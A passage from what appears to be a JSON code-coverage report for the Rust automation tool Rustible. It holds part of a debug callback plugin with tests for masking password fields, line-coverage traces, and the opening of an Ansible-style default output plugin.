formatted);\n            } else if verbosity \u003e= 4 {\n                // Show key facts at verbosity 4\n                println!(\"  {}:\", \"Key Facts\".cyan());\n                let key_facts = [\"os_family\", \"os_arch\", \"hostname\", \"user\"];\n                for key in \u0026key_facts {\n                    if let Some(value) = all_facts.get(*key) {\n                        println!(\"    {}: {}\", key.bright_white(), value);\n                    }\n                }\n            }\n\n            println!();\n        }\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[test]\n    fn test_mask_value() {\n        let data = serde_json::json!({\n            \"username\": \"admin\",\n            \"password\": \"secret123\",\n            \"api_key\": \"abc123\",\n            \"config\": {\n                \"host\": \"localhost\",\n                \"db_password\": \"dbpass\"\n            }\n        });\n\n        let masked = DebugCallback::mask_value(\u0026data);\n\n        assert_eq!(masked[\"username\"], \"admin\");\n        assert_eq!(masked[\"password\"], MASKED_VALUE);\n        assert_eq!(masked[\"api_key\"], MASKED_VALUE);\n        assert_eq!(masked[\"config\"][\"host\"], \"localhost\");\n        assert_eq!(masked[\"config\"][\"db_password\"], MASKED_VALUE);\n    }\n\n    #[test]\n    fn test_format_duration() {\n        assert_eq!(\n            DebugCallback::format_duration(Duration::from_millis(500)),\n            \"500ms\"\n        );\n        assert_eq!(\n            DebugCallback::format_duration(Duration::from_secs(5)),\n            \"5.000s\"\n        );\n        assert_eq!(\n            DebugCallback::format_duration(Duration::from_secs(65)),\n            \"1m 05s\"\n        );\n        assert_eq!(\n            DebugCallback::format_duration(Duration::from_secs(3665)),\n            \"1h 01m 05s\"\n        );\n    }\n\n    #[test]\n    fn test_debug_config_builder() {\n        let config = DebugConfig::new()\n            .with_verbosity(3)\n            .with_mask_sensitive(false)\n            .with_timestamps(true)\n            .with_task_args(true)\n            .with_all_facts(true);\n\n        assert_eq!(config.verbosity, 3);\n        assert!(!config.mask_sensitive);\n        assert!(config.show_timestamps);\n        assert!(config.show_task_args);\n        assert!(config.show_all_facts);\n    }\n\n    #[test]\n    fn test_verbosity_capped() {\n        let config = DebugConfig::new().with_verbosity(10);\n        assert_eq!(config.verbosity, 5);\n    }\n\n    #[tokio::test]\n    async fn test_debug_callback_tracks_stats() {\n        let callback = DebugCallback::with_verbosity(0); // Quiet for testing\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Simulate some task completions\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        let changed_result =\n            create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed_result).await;\n\n        let failed_result =\n            create_execution_result(\"host2\", \"task1\", false, false, false, \"error occurred\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        let skipped_result =\n            create_execution_result(\"host2\", \"task2\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped_result).await;\n\n        // Verify stats\n        let stats = callback.host_stats.read().await;\n\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.ok, 1);\n        assert_eq!(host1_stats.changed, 1);\n        assert_eq!(host1_stats.failed, 0);\n        assert_eq!(host1_stats.skipped, 0);\n\n        let host2_stats = stats.get(\"host2\").unwrap();\n        assert_eq!(host2_stats.ok, 0);\n        assert_eq!(host2_stats.changed, 0);\n        assert_eq!(host2_stats.failed, 1);\n        assert_eq!(host2_stats.skipped, 1);\n\n        assert!(callback.has_failures().await);\n    }\n\n    #[tokio::test]\n    async fn test_debug_callback_no_failures() {\n        let callback = DebugCallback::with_verbosity(0);\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        assert!(!callback.has_failures().await);\n    }\n\n    #[tokio::test]\n    async fn test_verbosity_levels() {\n        let callback = DebugCallback::new();\n        assert_eq!(callback.verbosity().await, 5); // Default max\n\n        callback.set_verbosity(3).await;\n        assert_eq!(callback.verbosity().await, 3);\n\n        callback.set_verbosity(10).await;\n        assert_eq!(callback.verbosity().await, 5); // Capped at max\n    }\n\n    #[tokio::test]\n    async fn test_set_variables() {\n        let callback = DebugCallback::new();\n\n        let mut vars = IndexMap::new();\n        vars.insert(\"test_var\".to_string(), serde_json::json!(\"test_value\"));\n\n        callback.set_variables(vars).await;\n\n        let stored_vars = callback.variables.read().await;\n        assert!(stored_vars.contains_key(\"test_var\"));\n    }\n\n    #[test]\n    fn test_default_trait() {\n        let callback = DebugCallback::default();\n        assert_eq!(*callback.config.blocking_read(), DebugConfig::default());\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let callback1 = DebugCallback::new();\n        let callback2 = callback1.clone();\n\n        // Both should share the same underlying state\n        assert!(Arc::ptr_eq(\u0026callback1.host_stats, \u0026callback2.host_stats));\n        assert!(Arc::ptr_eq(\n            \u0026callback1.has_failures,\n            \u0026callback2.has_failures\n        ));\n    }\n\n    #[test]\n    fn test_format_json_with_masking() {\n        let data = serde_json::json!({\n            \"user\": \"admin\",\n            \"password\": \"secret\"\n        });\n\n        let formatted = DebugCallback::format_json(\u0026data, true, 0);\n        assert!(formatted.contains(\"admin\"));\n        assert!(formatted.contains(MASKED_VALUE));\n        assert!(!formatted.contains(\"secret\"));\n    }\n\n    #[test]\n    fn test_format_json_without_masking() {\n        let data = serde_json::json!({\n            \"user\": \"admin\",\n            \"password\": \"secret\"\n        });\n\n        let formatted = DebugCallback::format_json(\u0026data, false, 0);\n        assert!(formatted.contains(\"admin\"));\n        assert!(formatted.contains(\"secret\"));\n        assert!(!formatted.contains(MASKED_VALUE));\n    }\n}\n","traces":[{"line":122,"address":[25471744],"length":1,"stats":{"Line":1}},{"line":129,"address":[25471757],"length":1,"stats":{"Line":1}},{"line":136,"address":[25463216],"length":1,"stats":{"Line":1}},{"line":137,"address":[25463224],"length":1,"stats":{"Line":1}},{"line":142,"address":[25462736,25462871],"length":1,"stats":{"Line":1}},{"line":143,"address":[25462761,25462832],"length":1,"stats":{"Line":2}},{"line":144,"address":[25462836],"length":1,"stats":{"Line":1}},{"line":149,"address":[25462960],"length":1,"stats":{"Line":1}},{"line":150,"address":[25462974],"length":1,"stats":{"Line":1}},{"line":151,"address":[25462980],"length":1,"stats":{"Line":1}},{"line":156,"address":[25462896],"length":1,"stats":{"Line":1}},{"line":157,"address":[25462910],"length":1,"stats":{"Line":1}},{"line":158,"address":[25462916],"length":1,"stats":{"Line":1}},{"line":163,"address":[25462672],"length":1,"stats":{"Line":1}},{"line":164,"address":[25462686],"length":1,"stats":{"Line":1}},{"line":165,"address":[25462692],"length":1,"stats":{"Line":1}},{"line":170,"address":[25462608],"length":1,"stats":{"Line":1}},{"line":171,"address":[25462622],"length":1,"stats":{"Line":1}},{"line":172,"address":[25462628],"length":1,"stats":{"Line":1}},{"line":177,"address":[25463024,25463191],"length":1,"stats":{"Line":0}},{"line":178,"address":[25463056,25463134],"length":1,"stats":{"Line":0}},{"line":179,"address":[25463156],"length":1,"stats":{"Line":0}},{"line":250,"address":[25471232],"length":1,"stats":{"Line":1}},{"line":251,"address":[25471246],"length":1,"stats":{"Line":1}},{"line":256,"address":[25465999,25465072],"length":1,"stats":{"Line":1}},{"line":258,"address":[25465089],"length":1,"stats":{"Line":1}},{"line":259,"address":[25465134,25465178],"length":1,"stats":{"Line":2}},{"line":260,"address":[25465316,25465241],"length":1,"stats":{"Line":2}},{"line":261,"address":[25465437,25465351],"length":1,"stats":{"Line":2}},{"line":262,"address":[25465514,25465470],"length":1,"stats":{"Line":2}},{"line":263,"address":[25465577,25465649],"length":1,"stats":{"Line":2}},{"line":264,"address":[25465726,25465682],"length":1,"stats":{"Line":2}},{"line":265,"address":[25465797,25465844],"length":1,"stats":{"Line":2}},{"line":281,"address":[25469328],"length":1,"stats":{"Line":1}},{"line":282,"address":[25469353],"length":1,"stats":{"Line":1}},{"line":286,"address":[30786377,30786441,30786604,30786948,30786352,30786480],"length":1,"stats":{"Line":4}},{"line":287,"address":[25984228],"length":1,"stats":{"Line":3}},{"line":291,"address":[25471736,25471728],"length":1,"stats":{"Line":4}},{"line":292,"address":[25977508],"length":1,"stats":{"Line":3}},{"line":296,"address":[25469310,25469296],"length":1,"stats":{"Line":5}},{"line":297,"address":[25988692],"length":1,"stats":{"Line":3}},{"line":301,"address":[30788377,30788400,30788000,30788025,30788208],"length":1,"stats":{"Line":4}},{"line":302,"address":[30788235,30788131,30788978,30788388,30788665,30788788,30788247,30788451,30788726],"length":1,"stats":{"Line":1}},{"line":306,"address":[30787168,30787337,30786985,30787360,30786960],"length":1,"stats":{"Line":0}},{"line":307,"address":[30787207,30787348,30787686,30787091,30787411,30787195,30787938,30787748,30787625],"length":1,"stats":{"Line":0}},{"line":311,"address":[25464232,25464454,25463248],"length":1,"stats":{"Line":1}},{"line":312,"address":[25463278],"length":1,"stats":{"Line":1}},{"line":313,"address":[25463460],"length":1,"stats":{"Line":1}},{"line":314,"address":[25463482],"length":1,"stats":{"Line":1}},{"line":315,"address":[25463561,25463500],"length":1,"stats":{"Line":2}},{"line":316,"address":[25463711,25463832],"length":1,"stats":{"Line":2}},{"line":317,"address":[25463938,25463985],"length":1,"stats":{"Line":2}},{"line":319,"address":[25463970],"length":1,"stats":{"Line":3}},{"line":321,"address":[25463997],"length":1,"stats":{"Line":1}},{"line":322,"address":[25464030,25464238,25464277],"length":1,"stats":{"Line":2}},{"line":324,"address":[25464006,25464080,25464210,25464057],"length":1,"stats":{"Line":2}},{"line":327,"address":[25463733],"length":1,"stats":{"Line":1}},{"line":329,"address":[25463352],"length":1,"stats":{"Line":0}},{"line":330,"address":[25463337],"length":1,"stats":{"Line":1}},{"line":335,"address":[25464480,25465045,25465051],"length":1,"stats":{"Line":1}},{"line":336,"address":[25464529],"length":1,"stats":{"Line":1}},{"line":337,"address":[25464555],"length":1,"stats":{"Line":1}},{"line":339,"address":[25464538],"length":1,"stats":{"Line":1}},{"line":342,"address":[25464804,25464565,25464673],"length":1,"stats":{"Line":3}},{"line":343,"address":[30785837,30785808],"length":1,"stats":{"Line":1}},{"line":345,"address":[25464777],"length":1,"stats":{"Line":3}},{"line":351,"address":[25469424],"length":1,"stats":{"Line":1}},{"line":352,"address":[25469450],"length":1,"stats":{"Line":1}},{"line":353,"address":[25469465],"length":1,"stats":{"Line":1}},{"line":355,"address":[25469479],"length":1,"stats":{"Line":1}},{"line":356,"address":[25469507],"length":1,"stats":{"Line":1}},{"line":357,"address":[25469527],"length":1,"stats":{"Line":1}},{"line":358,"address":[25469560],"length":1,"stats":{"Line":1}},{"line":359,"address":[25469580],"length":1,"stats":{"Line":1}},{"line":360,"address":[25469490],"length":1,"stats":{"Line":1}},{"line":361,"address":[25469885],"length":1,"stats":{"Line":1}},{"line":362,"address":[25469908],"length":1,"stats":{"Line":1}},{"line":363,"address":[25469931],"length":1,"stats":{"Line":1}},{"line":364,"address":[25469868],"length":1,"stats":{"Line":1}},{"line":365,"address":[25470308],"length":1,"stats":{"Line":1}},{"line":367,"address":[25470170],"length":1,"stats":{"Line":1}},{"line":372,"address":[25471145,25471151,25470992],"length":1,"stats":{"Line":0}},{"line":373,"address":[25471008],"length":1,"stats":{"Line":0}},{"line":374,"address":[25471032],"length":1,"stats":{"Line":0}},{"line":378,"address":[25470977,25470544,25470971],"length":1,"stats":{"Line":0}},{"line":379,"address":[25470568],"length":1,"stats":{"Line":0}},{"line":383,"address":[25471168],"length":1,"stats":{"Line":0}},{"line":384,"address":[25471169],"length":1,"stats":{"Line":0}},{"line":388,"address":[25471200],"length":1,"stats":{"Line":0}},{"line":389,"address":[25471201],"length":1,"stats":{"Line":0}},{"line":393,"address":[25471296,25471696,25471702],"length":1,"stats":{"Line":0}},{"line":394,"address":[25471343],"length":1,"stats":{"Line":0}},{"line":398,"address":[25469123,25466048,25467012],"length":1,"stats":{"Line":0}},{"line":399,"address":[25466189],"length":1,"stats":{"Line":0}},{"line":400,"address":[25466275,25466204,25466343],"length":1,"stats":{"Line":0}},{"line":401,"address":[25467938,25466359,25466425],"length":1,"stats":{"Line":0}},{"line":402,"address":[25467708,25466463,25466402,25466502],"length":1,"stats":{"Line":0}},{"line":403,"address":[25466579,25466479,25466540,25467478],"length":1,"stats":{"Line":0}},{"line":404,"address":[25466617,25466556,25466656,25467248],"length":1,"stats":{"Line":0}},{"line":405,"address":[25466694,25466729,25466633,25467018],"length":1,"stats":{"Line":0}},{"line":406,"address":[25466710,25466763],"length":1,"stats":{"Line":0}},{"line":409,"address":[25468222],"length":1,"stats":{"Line":0}},{"line":416,"address":[25468676],"length":1,"stats":{"Line":0}},{"line":417,"address":[25468785,25468730],"length":1,"stats":{"Line":0}},{"line":418,"address":[25468804],"length":1,"stats":{"Line":0}},{"line":420,"address":[25469080,25468756],"length":1,"stats":{"Line":0}},{"line":426,"address":[25471840],"length":1,"stats":{"Line":1}},{"line":427,"address":[25471848],"length":1,"stats":{"Line":1}},{"line":432,"address":[25457819,25457825,25457216],"length":1,"stats":{"Line":1}},{"line":434,"address":[25457254],"length":1,"stats":{"Line":1}},{"line":435,"address":[25457332,25457269],"length":1,"stats":{"Line":2}},{"line":436,"address":[25457337,25457397],"length":1,"stats":{"Line":2}},{"line":437,"address":[25457402,25457462],"length":1,"stats":{"Line":2}},{"line":438,"address":[25457467,25457527],"length":1,"stats":{"Line":2}},{"line":439,"address":[25457532,25457592],"length":1,"stats":{"Line":2}},{"line":440,"address":[25457600,25457663],"length":1,"stats":{"Line":2}},{"line":441,"address":[25457671],"length":1,"stats":{"Line":1}},{"line":449,"address":[30780742,30780713,30780496,30780692,30780607,30780884,30780527,30781403,30780650,30780671,30784177],"length":1,"stats":{"Line":4}},{"line":450,"address":[30780585,30780637,30780918,30780797],"length":1,"stats":{"Line":2}},{"line":451,"address":[30781159,30781230],"length":1,"stats":{"Line":2}},{"line":454,"address":[26124734],"length":1,"stats":{"Line":1}},{"line":455,"address":[26124749,26124880,26124934],"length":1,"stats":{"Line":1}},{"line":458,"address":[30780700,30782497,30782692],"length":1,"stats":{"Line":1}},{"line":459,"address":[26124785],"length":1,"stats":{"Line":1}},{"line":461,"address":[30783433],"length":1,"stats":{"Line":1}},{"line":462,"address":[30783457],"length":1,"stats":{"Line":0}},{"line":463,"address":[30783502],"length":1,"stats":{"Line":0}},{"line":464,"address":[30783575,30783646],"length":1,"stats":{"Line":0}},{"line":469,"address":[30783918],"length":1,"stats":{"Line":0}},{"line":471,"address":[30783933,30783957],"length":1,"stats":{"Line":0}},{"line":472,"address":[30783988],"length":1,"stats":{"Line":0}},{"line":475,"address":[30783939],"length":1,"stats":{"Line":0}},{"line":476,"address":[30784119],"length":1,"stats":{"Line":0}},{"line":481,"address":[25453082],"length":1,"stats":{"Line":0}},{"line":482,"address":[26119535],"length":1,"stats":{"Line":0}},{"line":483,"address":[30766967,30767038],"length":1,"stats":{"Line":0}},{"line":484,"address":[30767044,30767184,30766508],"length":1,"stats":{"Line":0}},{"line":485,"address":[26119565],"length":1,"stats":{"Line":0}},{"line":487,"address":[30767854,30770208],"length":1,"stats":{"Line":0}},{"line":488,"address":[30767878,30767944],"length":1,"stats":{"Line":0}},{"line":489,"address":[30767963],"length":1,"stats":{"Line":0}},{"line":490,"address":[30768028,30768112,30768192],"length":1,"stats":{"Line":0}},{"line":495,"address":[30768475],"length":1,"stats":{"Line":0}},{"line":498,"address":[30768560,30768490],"length":1,"stats":{"Line":0}},{"line":499,"address":[30768606,30768686],"length":1,"stats":{"Line":0}},{"line":501,"address":[30768693,30768891],"length":1,"stats":{"Line":0}},{"line":502,"address":[30770300,30768962],"length":1,"stats":{"Line":0}},{"line":503,"address":[30770381],"length":1,"stats":{"Line":0}},{"line":504,"address":[30770408,30770584],"length":1,"stats":{"Line":0}},{"line":505,"address":[30770392],"length":1,"stats":{"Line":0}},{"line":506,"address":[30770461,30770553],"length":1,"stats":{"Line":0}},{"line":508,"address":[30770436,30770488],"length":1,"stats":{"Line":0}},{"line":511,"address":[30770721,30770681,30770853,30770954,30770767,30770807,30770893],"length":1,"stats":{"Line":0}},{"line":524,"address":[30771662],"length":1,"stats":{"Line":0}},{"line":525,"address":[30771747,30771816,30771886],"length":1,"stats":{"Line":0}},{"line":536,"address":[30769007],"length":1,"stats":{"Line":0}},{"line":537,"address":[30769171,30769085],"length":1,"stats":{"Line":0}},{"line":538,"address":[30769186],"length":1,"stats":{"Line":0}},{"line":539,"address":[30769309,30769223],"length":1,"stats":{"Line":0}},{"line":541,"address":[30769192,30769254],"length":1,"stats":{"Line":0}},{"line":544,"address":[30769283,30769382],"length":1,"stats":{"Line":0}},{"line":545,"address":[30769401],"length":1,"stats":{"Line":0}},{"line":546,"address":[30769544,30769628,30769469],"length":1,"stats":{"Line":0}},{"line":553,"address":[30769959,30769983],"length":1,"stats":{"Line":0}},{"line":554,"address":[30770020],"length":1,"stats":{"Line":0}},{"line":557,"address":[30769965],"length":1,"stats":{"Line":0}},{"line":560,"address":[30770181,30769119],"length":1,"stats":{"Line":0}},{"line":567,"address":[25452863],"length":1,"stats":{"Line":4}},{"line":568,"address":[30758431,30758313,30758261,30758552],"length":1,"stats":{"Line":2}},{"line":569,"address":[30758864,30758793],"length":1,"stats":{"Line":2}},{"line":573,"address":[26113790],"length":1,"stats":{"Line":1}},{"line":574,"address":[30759236,30759327],"length":1,"stats":{"Line":2}},{"line":575,"address":[30759449,30761502],"length":1,"stats":{"Line":2}},{"line":579,"address":[30759490],"length":1,"stats":{"Line":1}},{"line":580,"address":[30759514],"length":1,"stats":{"Line":0}},{"line":581,"address":[30759559],"length":1,"stats":{"Line":0}},{"line":582,"address":[30760004],"length":1,"stats":{"Line":0}},{"line":589,"address":[30760373],"length":1,"stats":{"Line":0}},{"line":591,"address":[30760388],"length":1,"stats":{"Line":0}},{"line":593,"address":[30760431],"length":1,"stats":{"Line":0}},{"line":594,"address":[30760497,30760992],"length":1,"stats":{"Line":0}},{"line":596,"address":[30760705,30760641],"length":1,"stats":{"Line":0}},{"line":598,"address":[30760552,30760446],"length":1,"stats":{"Line":0}},{"line":599,"address":[30760592,30760684],"length":1,"stats":{"Line":0}},{"line":602,"address":[30760925,30761050],"length":1,"stats":{"Line":0}},{"line":605,"address":[30761328],"length":1,"stats":{"Line":0}},{"line":606,"address":[26113805],"length":1,"stats":{"Line":0}},{"line":607,"address":[30761893,30761830],"length":1,"stats":{"Line":0}},{"line":608,"address":[30761977,30761920],"length":1,"stats":{"Line":0}},{"line":609,"address":[30762144],"length":1,"stats":{"Line":0}},{"line":610,"address":[30762373],"length":1,"stats":{"Line":0}},{"line":611,"address":[30762495,30762424],"length":1,"stats":{"Line":0}},{"line":617,"address":[30762837,30760394],"length":1,"stats":{"Line":0}},{"line":622,"address":[30757017,30757084,30758168,30757123,30756992,30757239,30758145],"length":1,"stats":{"Line":0}},{"line":623,"address":[26111492],"length":1,"stats":{"Line":0}},{"line":624,"address":[30757473,30757525],"length":1,"stats":{"Line":0}},{"line":626,"address":[30757535],"length":1,"stats":{"Line":0}},{"line":627,"address":[30757559],"length":1,"stats":{"Line":0}},{"line":628,"address":[30757596,30757687],"length":1,"stats":{"Line":0}},{"line":630,"address":[30757565,30757627],"length":1,"stats":{"Line":0}},{"line":632,"address":[30757738],"length":1,"stats":{"Line":0}},{"line":642,"address":[30763070,30763091,30763262,30762943,30762912,30763740,30763120,30766303,30763027],"length":1,"stats":{"Line":0}},{"line":643,"address":[30763057,30763005,30763175,30763296],"length":1,"stats":{"Line":0}},{"line":644,"address":[30763537,30763608],"length":1,"stats":{"Line":0}},{"line":647,"address":[30763614,30764185,30763897,30763691,30763980],"length":1,"stats":{"Line":0}},{"line":649,"address":[30763721,30763676,30763754,30763078,30763961],"length":1,"stats":{"Line":0}},{"line":650,"address":[30764201,30764043,30764070,30764003,30764130,30765322],"length":1,"stats":{"Line":0}},{"line":652,"address":[30764239],"length":1,"stats":{"Line":0}},{"line":653,"address":[30764268],"length":1,"stats":{"Line":0}},{"line":654,"address":[30764341,30764412],"length":1,"stats":{"Line":0}},{"line":661,"address":[30765052],"length":1,"stats":{"Line":0}},{"line":664,"address":[30764253],"length":1,"stats":{"Line":0}},{"line":665,"address":[30765090],"length":1,"stats":{"Line":0}},{"line":668,"address":[30765174,30765131],"length":1,"stats":{"Line":0}},{"line":669,"address":[26114093],"length":1,"stats":{"Line":0}},{"line":670,"address":[30765644,30765587],"length":1,"stats":{"Line":0}},{"line":671,"address":[30765665,30765722],"length":1,"stats":{"Line":0}},{"line":672,"address":[30765889],"length":1,"stats":{"Line":0}},{"line":673,"address":[30765991,30766050],"length":1,"stats":{"Line":0}},{"line":674,"address":[30766161,30766090],"length":1,"stats":{"Line":0}},{"line":678,"address":[30766271,30765137],"length":1,"stats":{"Line":0}},{"line":683,"address":[30772272,30772443,30772303,30772422,30772464,30772493,30772635,30777235,30772379,30773113],"length":1,"stats":{"Line":4}},{"line":684,"address":[26122271],"length":1,"stats":{"Line":2}},{"line":685,"address":[30772910,30772981],"length":1,"stats":{"Line":2}},{"line":689,"address":[30773127,30772430,30772987],"length":1,"stats":{"Line":1}},{"line":690,"address":[30773345,30773416],"length":1,"stats":{"Line":2}},{"line":691,"address":[30773517],"length":1,"stats":{"Line":1}},{"line":693,"address":[30773549,30774035],"length":1,"stats":{"Line":2}},{"line":694,"address":[30774032,30774037,30773593],"length":1,"stats":{"Line":2}},{"line":695,"address":[30773570],"length":1,"stats":{"Line":1}},{"line":696,"address":[30773703,30773729,30773629],"length":1,"stats":{"Line":2}},{"line":697,"address":[26122301],"length":1,"stats":{"Line":2}},{"line":698,"address":[30773994,30773658,30773931],"length":1,"stats":{"Line":3}},{"line":699,"address":[30773996,30773892,30773991],"length":1,"stats":{"Line":2}},{"line":701,"address":[30773928,30773863,30773933],"length":1,"stats":{"Line":2}},{"line":706,"address":[30774536,30774384,30774447],"length":1,"stats":{"Line":3}},{"line":707,"address":[30774428],"length":1,"stats":{"Line":1}},{"line":708,"address":[30774405,30774626,30774479,30774512],"length":1,"stats":{"Line":4}},{"line":709,"address":[30774452],"length":1,"stats":{"Line":1}},{"line":710,"address":[30774594,30774565,30774489],"length":1,"stats":{"Line":3}},{"line":711,"address":[30774567],"length":1,"stats":{"Line":1}},{"line":713,"address":[30774538],"length":1,"stats":{"Line":1}},{"line":716,"address":[30774636],"length":1,"stats":{"Line":1}},{"line":719,"address":[30774668,30772472,30774802],"length":1,"stats":{"Line":0}},{"line":720,"address":[30775293,30775052],"length":1,"stats":{"Line":0}},{"line":721,"address":[30775123],"length":1,"stats":{"Line":0}},{"line":722,"address":[30777273,30775190,30777264],"length":1,"stats":{"Line":0}},{"line":723,"address":[30775235],"length":1,"stats":{"Line":0}},{"line":727,"address":[30775351,30775542,30775411],"length":1,"stats":{"Line":0}},{"line":728,"address":[30775372,30775526],"length":1,"stats":{"Line":0}},{"line":730,"address":[30775445],"length":1,"stats":{"Line":0}},{"line":733,"address":[30775465,30775586],"length":1,"stats":{"Line":0}},{"line":736,"address":[30775627],"length":1,"stats":{"Line":0}},{"line":738,"address":[30775670],"length":1,"stats":{"Line":0}},{"line":739,"address":[30775799,30775726],"length":1,"stats":{"Line":0}},{"line":740,"address":[30775966],"length":1,"stats":{"Line":0}},{"line":741,"address":[30776091,30776020],"length":1,"stats":{"Line":0}},{"line":745,"address":[30776186,30775765],"length":1,"stats":{"Line":0}},{"line":746,"address":[30776276,30776200],"length":1,"stats":{"Line":0}},{"line":747,"address":[30776380],"length":1,"stats":{"Line":0}},{"line":752,"address":[30776671,30776237],"length":1,"stats":{"Line":0}},{"line":753,"address":[30776944,30776863,30776752],"length":1,"stats":{"Line":0}},{"line":761,"address":[30775633,30777203],"length":1,"stats":{"Line":0}},{"line":766,"address":[25453391],"length":1,"stats":{"Line":0}},{"line":767,"address":[26129956],"length":1,"stats":{"Line":0}},{"line":768,"address":[30784698,30784752],"length":1,"stats":{"Line":0}},{"line":770,"address":[30784762],"length":1,"stats":{"Line":0}},{"line":771,"address":[30784781],"length":1,"stats":{"Line":0}},{"line":776,"address":[25453223],"length":1,"stats":{"Line":0}},{"line":777,"address":[26124599],"length":1,"stats":{"Line":0}},{"line":778,"address":[30777876,30777933],"length":1,"stats":{"Line":0}},{"line":780,"address":[30777947],"length":1,"stats":{"Line":0}},{"line":781,"address":[30777969],"length":1,"stats":{"Line":0}},{"line":782,"address":[30778113,30778042],"length":1,"stats":{"Line":0}},{"line":788,"address":[30778658],"length":1,"stats":{"Line":0}},{"line":790,"address":[30778673],"length":1,"stats":{"Line":0}},{"line":791,"address":[30778702],"length":1,"stats":{"Line":0}},{"line":794,"address":[30778989,30779011],"length":1,"stats":{"Line":0}},{"line":795,"address":[30779913,30779034],"length":1,"stats":{"Line":0}},{"line":796,"address":[30780085],"length":1,"stats":{"Line":0}},{"line":797,"address":[30780139,30780198],"length":1,"stats":{"Line":0}},{"line":798,"address":[30780309,30780238],"length":1,"stats":{"Line":0}},{"line":799,"address":[30778997,30780378,30780265,30780150],"length":1,"stats":{"Line":0}},{"line":801,"address":[30779097],"length":1,"stats":{"Line":0}},{"line":802,"address":[30779295],"length":1,"stats":{"Line":0}},{"line":803,"address":[30779403],"length":1,"stats":{"Line":0}},{"line":804,"address":[30779556],"length":1,"stats":{"Line":0}},{"line":805,"address":[30779644],"length":1,"stats":{"Line":0}},{"line":810,"address":[30779068,30780419],"length":1,"stats":{"Line":0}}],"covered":123,"coverable":289},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","default.rs"],"content":"//! Default Callback Plugin for Rustible\n//!\n//! This plugin produces Ansible-like colored terminal output including:\n//! - Play headers with asterisk lines\n//! - Task headers with asterisk lines\n//! - Colored status per host (ok/changed/failed/skipped)\n//! - Final recap with per-host statistics\n//! - Support for verbosity levels (-v, -vv, -vvv, -vvvv)\n//! - NO_COLOR environment variable support for CI environments\n//!\n//! # Features\n//!\n//! - **Ansible-compatible output**: Familiar format for Ansible users\n//! - **Colored status indicators**: Green (ok), Yellow (changed), Red (failed), Cyan (skipped)\n//! - **Verbosity levels**: Increasing detail with -v flags\n//! - **CI-friendly**: Respects NO_COLOR environment variable\n//! - **Diff support**: Optional diff output for file changes\n//! - **Duration tracking**: Per-task and per-playbook timing\n//!\n//! # Example Output\n//!\n//! ```text\n//! PLAY [webservers] **************************************************************\n//!\n//! TASK [Install nginx] ***********************************************************\n//! changed: [web1]\n//! changed: [web2]\n//! ok: [web3]\n//!\n//! PLAY RECAP *********************************************************************\n//! web1                       : ok=5    changed=2    unreachable=0    failed=0    skipped=1\n//! web2                       : ok=5    changed=2    unreachable=0    failed=0    skipped=1\n//! web3                       : ok=6    changed=1    unreachable=0    failed=0    skipped=0\n//!\n//! Playbook run took 12.34s\n//! ```\n//!\n//! # Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::DefaultCallback;\n//!\n//! // Create with default settings\n//! let callback = DefaultCallback::new();\n//!\n//! // Create with specific verbosity and no-color mode\n//! let callback = DefaultCallback::new()\n//!     .with_verbosity(2)  // -vv\n//!     .with_no_color(true);  // For CI\n//!\n//! // Using builder pattern\n//! let callback = DefaultCallbackBuilder::new()\n//!     .verbosity(3)\n//!     .show_diff(true)\n//!     .build();\n//!\n//! executor.with_callback(Box::new(callback));\n//! ```\n\nuse std::collections::HashMap;\nuse std::io::{self, Write};\nuse std::sync::atomic::{AtomicBool, AtomicU8, Ordering};\nuse std::time::{Duration, Instant};\n\nuse async_trait::async_trait;\nuse colored::{Color, Colorize};\nuse parking_lot::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult, ModuleResult};\n\n// ============================================================================\n// Constants\n// ============================================================================\n\n/// The default width for output formatting (Ansible standard)\nconst OUTPUT_WIDTH: usize = 80;\n\n// ============================================================================\n// Verbosity Levels\n// ============================================================================\n\n/// Verbosity levels for output control\n#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]\npub enum Verbosity {\n    /// No verbose output (default)\n    Normal = 0,\n    /// -v: Show task results\n    Verbose = 1,\n    /// -vv: Show task input parameters\n    MoreVerbose = 2,\n    /// -vvv: Show connection debugging\n    Debug = 3,\n    /// -vvvv: Show full connection debugging\n    ConnectionDebug = 4,\n    /// -vvvvv: Internal debugging\n    WinRMDebug = 5,\n}\n\nimpl From\u003cu8\u003e for Verbosity {\n    fn from(level: u8) -\u003e Self {\n        match level {\n            0 =\u003e Verbosity::Normal,\n            1 =\u003e Verbosity::Verbose,\n            2 =\u003e Verbosity::MoreVerbose,\n            3 =\u003e Verbosity::Debug,\n            4 =\u003e Verbosity::ConnectionDebug,\n            _ =\u003e Verbosity::WinRMDebug,\n        }\n    }\n}\n\n// ============================================================================\n// Host Statistics\n// ============================================================================\n\n/// Per-host execution statistics\n#[derive(Debug, Clone, Default)]\npub struct HostStats {\n    /// Successfully completed tasks with no changes\n    pub ok: u32,\n    /// Tasks that made changes\n    pub changed: u32,\n    /// Tasks that failed\n    pub failed: 